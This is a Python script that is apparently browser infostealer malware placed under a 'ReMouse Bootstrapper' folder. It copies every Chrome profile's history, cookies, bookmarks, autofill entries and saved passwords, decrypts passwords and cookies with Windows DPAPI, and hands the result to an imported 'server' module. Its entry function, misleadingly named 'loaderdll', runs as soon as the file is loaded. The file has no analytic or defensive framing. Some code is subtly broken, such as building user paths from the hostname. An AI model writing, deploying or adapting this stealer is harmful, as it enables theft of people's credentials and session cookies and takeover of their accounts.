import os
import shutil
import json
import socket
import platform
import sys
import sqlite3
from pathlib import Path
import win32crypt

hostname = socket.gethostname()
custom_path = f"C:\\Users\\{hostname}\\Downloads\\ReMouse Bootstrapper\\"
sys.path.append(custom_path)
import server

def copy_file(src_path: Path, dest_path: Path):
    try:
        shutil.copy2(src_path, dest_path)
        return True
    except Exception:
        return False

def decrypt_chrome_password(encrypted_password):
    try:
        if encrypted_password.startswith(b'\x01\x00\x00\x00'):
            encrypted_password = encrypted_password[3:]
        decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
        return decrypted.decode()
    except Exception as e:
        return f"<decryption error: {e}>"

def extract_sqlite_db(db_path: Path, query: str):
    temp_path = Path("temp_copy.db")
    if not copy_file(db_path, temp_path):
        return None
    try:
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute(query)
        rows = cursor.fetchall()
        conn.close()
        temp_path.unlink()
        return rows
    except Exception:
        return None

def extract_history(profile_path: Path):
    history_db = profile_path / "History"
    query = "SELECT url, title, visit_count, last_visit_time FROM urls"
    rows = extract_sqlite_db(history_db, query)
    if rows is None:
        return {"error": "Failed to extract history"}
    history = []
    for url, title, visit_count, last_visit_time in rows:
        history.append({
            "url": url,
            "title": title,
            "visit_count": visit_count,
            "last_visit_time": last_visit_time
        })
    return history

def extract_cookies(profile_path: Path):
    cookies_db = profile_path / "Cookies"
    query = "SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies"
    rows = extract_sqlite_db(cookies_db, query)
    if rows is None:
        return {"error": "Failed to extract cookies"}
    cookies = []
    for host, name, encrypted_value, path, expires in rows:
        decrypted_value = decrypt_chrome_password(encrypted_value)
        cookies.append({
            "host": host,
            "name": name,
            "value": decrypted_value,
            "path": path,
            "expires_utc": expires
        })
    return cookies

def extract_bookmarks(profile_path: Path):
    bookmarks_file = profile_path / "Bookmarks"
    if not bookmarks_file.exists():
        return {"error": "Bookmarks file not found"}
    try:
        with open(bookmarks_file, "r", encoding="utf-8") as f:
            bookmarks_json = json.load(f)
        return bookmarks_json
    except Exception as e:
        return {"error": f"Failed to read bookmarks: {e}"}

def extract_autofill(profile_path: Path):
    autofill_db = profile_path / "Web Data"
    query = "SELECT name, value, date_created, date_last_used FROM autofill"
    rows = extract_sqlite_db(autofill_db, query)
    if rows is None:
        return {"error": "Failed to extract autofill data"}
    autofill = []
    for name, value, created, last_used in rows:
        autofill.append({
            "name": name,
            "value": value,
            "date_created": created,
            "date_last_used": last_used
        })
    return autofill

def extract_passwords(profile_path: Path):
    login_db = profile_path / "Login Data"
    query = "SELECT origin_url, username_value, password_value FROM logins"
    rows = extract_sqlite_db(login_db, query)
    if rows is None:
        return {"error": "Failed to extract passwords"}
    passwords = []
    for origin_url, username, encrypted_password in rows:
        decrypted_password = decrypt_chrome_password(encrypted_password)
        passwords.append({
            "url": origin_url,
            "username": username,
            "password": decrypted_password
        })
    return passwords

def loaderdll():
    quick_grab = {
        "type": "quick_grab",
        "hostname": socket.gethostname,
        "ip": socket.gethostbyname(hostname),
        "os": platform.platform(),
    }

    file_path = Path(f"C:\\Users\\{hostname}\\AppData\\Local\\Google\\Chrome")

    if not file_path.exists():
        print("File does not exist. Exiting.")
        sys.exit()

    chrome_base_path = Path(f"C:\\Users\\{hostname}\\AppData\\Local\\Google\\Chrome\\User Data")
    if not chrome_base_path.exists():
        print("Chrome user data path not found. Exiting.")
        sys.exit()

    all_profiles_data = {}

    for profile_dir in chrome_base_path.iterdir():
        if not profile_dir.is_dir():
            continue
        profile_name = profile_dir.name

        profile_data = {
            "history": extract_history(profile_dir),
            "cookies": extract_cookies(profile_dir),
            "bookmarks": extract_bookmarks(profile_dir),
            "autofill": extract_autofill(profile_dir),
            "passwords": extract_passwords(profile_dir),
        }

        all_profiles_data[profile_name] = profile_data

    server.connect(data=all_profiles_data)

    print(quick_grab)

loaderdll()
